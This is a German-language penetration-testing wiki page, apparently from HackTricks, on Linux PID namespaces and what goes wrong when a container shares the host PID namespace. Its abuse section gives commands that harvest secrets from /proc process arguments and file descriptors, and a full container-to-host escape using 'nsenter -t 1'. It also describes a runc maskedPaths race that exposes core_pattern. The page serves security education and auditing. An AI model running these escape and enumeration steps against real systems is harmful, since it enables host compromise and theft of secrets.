# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der PID namespace steuert, wie Prozesse nummeriert werden und welche Prozesse sichtbar sind. Deshalb kann ein Container eine eigene PID 1 haben, obwohl er keine echte Maschine ist. Innerhalb des namespace sieht die Workload einen lokalen Prozessbaum. Außerhalb des namespace sieht der Host weiterhin die echten Host-PIDs und die vollständige Prozesslandschaft.

Aus Sicherheitssicht ist der PID namespace wichtig, weil die Sichtbarkeit von Prozessen wertvoll ist. Sobald eine Workload Host-Prozesse sehen kann, kann sie möglicherweise Servicenamen, Command-Line-Argumente, in Prozessargumenten übergebene Secrets, aus der Umgebung abgeleitete Zustände über `/proc` und potenzielle Ziele für den namespace-Eintritt beobachten. Wenn sie mehr tun kann, als diese Prozesse nur zu sehen, beispielsweise unter den richtigen Bedingungen Signale zu senden oder ptrace zu verwenden, wird das Problem deutlich schwerwiegender.

## Funktionsweise

Ein neuer PID namespace beginnt mit einer eigenen internen Prozessnummerierung. Der erste darin erstellte Prozess wird aus Sicht des namespace zu PID 1. Dadurch erhält er auch spezielle init-ähnliche Semantik für verwaiste Kindprozesse und das Verhalten von Signalen. Das erklärt viele Besonderheiten von Containern im Zusammenhang mit init-Prozessen, dem Aufräumen von Zombie-Prozessen und der gelegentlichen Verwendung kleiner init-Wrapper in Containern.

Die wichtige Sicherheitslektion ist, dass ein Prozess isoliert wirken kann, weil er nur seinen eigenen PID-Baum sieht, diese Isolation jedoch absichtlich entfernt werden kann. Docker stellt dies über `--pid=host` bereit, während Kubernetes dies über `hostPID: true` ermöglicht. Sobald der Container dem Host-PID-namespace beitritt, sieht die Workload Host-Prozesse direkt, und viele nachfolgende Angriffspfade werden deutlich realistischer.

## Lab

Um manuell einen PID namespace zu erstellen:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die Shell sieht nun eine private Prozessansicht. Das Flag `--mount-proc` ist wichtig, da es eine procfs-Instanz einbindet, die dem neuen PID namespace entspricht und dadurch die Prozessliste innerhalb des Namespace konsistent macht.

Zum Vergleich des Containerverhaltens:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Der Unterschied ist unmittelbar und leicht zu verstehen, weshalb dies ein gutes erstes Lab für Leser ist.

## Runtime Usage

Normale Container in Docker, Podman, containerd und CRI-O erhalten ihren eigenen PID namespace. Kubernetes Pods erhalten normalerweise ebenfalls eine isolierte PID-Ansicht, sofern der Workload nicht ausdrücklich die gemeinsame Nutzung der Host-PID anfordert. LXC/Incus-Umgebungen verwenden dasselbe Kernel-Primitiv, obwohl Anwendungsfälle mit System-Containern möglicherweise kompliziertere Prozessbäume aufweisen und zu mehr Debugging-Abkürzungen verleiten.

Dieselbe Regel gilt überall: Wenn die Runtime den PID namespace nicht isoliert hat, stellt dies eine bewusste Verringerung der Container-Grenze dar.

## Misconfigurations

Die klassische Misconfiguration ist die gemeinsame Nutzung des Host-PID namespace. Teams rechtfertigen dies häufig mit Debugging-, Monitoring- oder Service-Management-Komfort, doch es sollte stets als bedeutende Sicherheitsausnahme behandelt werden. Selbst wenn der Container keine unmittelbare Write Primitive gegenüber Host-Prozessen besitzt, kann allein die Sichtbarkeit viele Informationen über das System offenlegen. Sobald Capabilities wie `CAP_SYS_PTRACE` oder nützlicher procfs-Zugriff hinzukommen, steigt das Risiko erheblich.

Ein weiterer Fehler besteht in der Annahme, dass die gemeinsame Nutzung des Host-PID namespace harmlos sei, weil der Workload Host-Prozesse standardmäßig weder killen noch ptracen kann. Diese Schlussfolgerung ignoriert den Wert der Enumeration, die Verfügbarkeit von Zielen für den Namespace-Eintritt und die Tatsache, dass PID-Sichtbarkeit mit anderen abgeschwächten Kontrollen kombiniert werden kann.

## Abuse

Wenn der Host-PID namespace gemeinsam genutzt wird, kann ein Angreifer Host-Prozesse untersuchen, Prozessargumente sammeln, interessante Services identifizieren, geeignete PIDs für `nsenter` finden oder die Prozesssichtbarkeit mit ptrace-bezogenen Privilegien kombinieren, um Host- oder benachbarte Workloads zu beeinträchtigen. In manchen Fällen reicht es bereits aus, den richtigen dauerhaft laufenden Prozess zu sehen, um den weiteren Angriffsplan neu auszurichten.

Der erste praktische Schritt besteht immer darin zu bestätigen, dass Host-Prozesse tatsächlich sichtbar sind:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sobald Host-PIDs sichtbar sind, werden Prozessargumente und Ziele zum Betreten von Namespaces häufig zur nützlichsten Informationsquelle:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Wenn `nsenter` verfügbar ist und ausreichende Berechtigungen vorhanden sind, teste, ob ein sichtbarer Host-Prozess als Namespace-Brücke verwendet werden kann:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selbst wenn der Eintritt blockiert ist, ist die Freigabe der Host-PIDs bereits wertvoll, da sie die Dienststruktur, Laufzeitkomponenten und potenzielle privilegierte Prozesse offenlegt, die als Nächstes angegriffen werden können.

Die Sichtbarkeit der Host-PIDs macht auch den Missbrauch von File Descriptors realistischer. Wenn ein privilegierter Host-Prozess oder eine benachbarte Workload eine vertrauliche Datei oder einen Socket geöffnet hat, kann der Angreifer möglicherweise `/proc/<pid>/fd/` untersuchen und diesen Handle wiederverwenden – abhängig von den Besitzverhältnissen, den procfs-Mount-Optionen und dem Modell des Zieldienstes.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Diese Befehle sind nützlich, weil sie beantworten, ob `hidepid=1` oder `hidepid=2` die Sichtbarkeit zwischen Prozessen reduziert und ob offensichtlich interessante Deskriptoren wie geöffnete geheime Dateien, Logs oder Unix-Sockets überhaupt sichtbar sind.

### Vollständiges Beispiel: Host-PID + `nsenter`

Die gemeinsame Nutzung der Host-PIDs wird zu einem direkten Host-Escape, wenn der Prozess außerdem über ausreichende Berechtigungen verfügt, um den Host-Namespaces beizutreten:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Wenn der Befehl erfolgreich ist, wird der Containerprozess nun in den Mount-, UTS-, Netzwerk-, IPC- und PID-Namespaces des Hosts ausgeführt. Die Auswirkungen entsprechen einer sofortigen Kompromittierung des Hosts.

Selbst wenn `nsenter` selbst fehlt, kann dasselbe Ergebnis möglicherweise über die Binärdatei des Hosts erreicht werden, sofern das Host-Dateisystem eingebunden ist:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Aktuelle Hinweise zur Laufzeit

Einige für PID-Namespaces relevante Angriffe sind keine herkömmlichen Fehlkonfigurationen von `hostPID: true`, sondern Implementierungsfehler der Laufzeitumgebung im Zusammenhang damit, wie procfs-Schutzmaßnahmen während der Container-Einrichtung angewendet werden.

#### Race bei `maskedPaths` auf das Host-procfs

In anfälligen `runc`-Versionen konnten Angreifer, die das Container-Image oder die `runc exec`-Workload kontrollieren konnten, die Maskierungsphase durch das Ersetzen des containerseitigen `/dev/null` durch einen Symlink auf einen sensiblen procfs-Pfad wie `/proc/sys/kernel/core_pattern` austricksen. Wenn die Race erfolgreich war, konnte der Bind-Mount des maskierten Pfads am falschen Ziel landen und hostweite procfs-Schalter für den neuen Container offenlegen.

Nützlicher Befehl für die Überprüfung:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Dies ist wichtig, weil die letztendlichen Auswirkungen denen einer direkten procfs-Exposition entsprechen können: beschreibbares `core_pattern` oder `sysrq-trigger`, gefolgt von Codeausführung auf dem Host oder einer Denial of Service.

#### Namespace injection mit `insject`

Tools für Namespace injection wie `insject` zeigen, dass die Interaktion mit einem PID-Namespace nicht immer erfordert, vor der Prozesserstellung in den Ziel-Namespace einzutreten. Ein Helfer kann sich später anhängen, `setns()` verwenden und die Ausführung fortsetzen, während die Sichtbarkeit für den Ziel-PID-Bereich erhalten bleibt:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Diese Art von Technik ist hauptsächlich für fortgeschrittenes Debugging, offensive Tooling- und Post-Exploitation-Workflows relevant, bei denen der Namespace-Kontext erst verbunden werden muss, nachdem die Runtime die Workload bereits initialisiert hat.

### Verwandte FD-Missbrauchsmuster

Zwei Muster sollten ausdrücklich erwähnt werden, wenn Host-PIDs sichtbar sind. Erstens kann ein privilegierter Prozess einen sensiblen File Descriptor über `execve()` hinweg offen halten, weil er nicht mit `O_CLOEXEC` markiert wurde. Zweitens können Services File Descriptors über Unix-Sockets mittels `SCM_RIGHTS` weitergeben. In beiden Fällen ist nicht mehr der Pfad das interessante Objekt, sondern der bereits geöffnete Handle, den ein Prozess mit niedrigeren Privilegien erben oder empfangen kann.

Das ist bei Container-Arbeiten relevant, weil der Handle auf `docker.sock`, ein privilegiertes Log, eine geheime Datei des Hosts oder ein anderes hochwertiges Objekt zeigen kann, selbst wenn der Pfad selbst vom Container-Dateisystem aus nicht direkt erreichbar ist.

## Prüfungen

Der Zweck dieser Befehle besteht darin festzustellen, ob der Prozess eine private PID-Sicht hat oder bereits eine deutlich umfassendere Prozesslandschaft auflisten kann.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Was ist hier interessant:

- Wenn die Prozessliste offensichtliche Host-Dienste enthält, ist Host-PID-Sharing wahrscheinlich bereits aktiv.
- Nur einen kleinen container-lokalen Prozessbaum zu sehen, ist der normale Ausgangszustand; `systemd`, `dockerd` oder nicht zugehörige Daemons zu sehen, ist dies nicht.
- Sobald Host-PIDs sichtbar sind, werden selbst schreibgeschützte Prozessinformationen für Reconnaissance nützlich.

Wenn du einen Container entdeckst, der mit Host-PID-Sharing läuft, solltest du dies nicht als rein kosmetischen Unterschied betrachten. Es ist eine erhebliche Veränderung dessen, was der Workload beobachten und potenziell beeinflussen kann.
{{#include ../../../../../banners/hacktricks-training.md}}
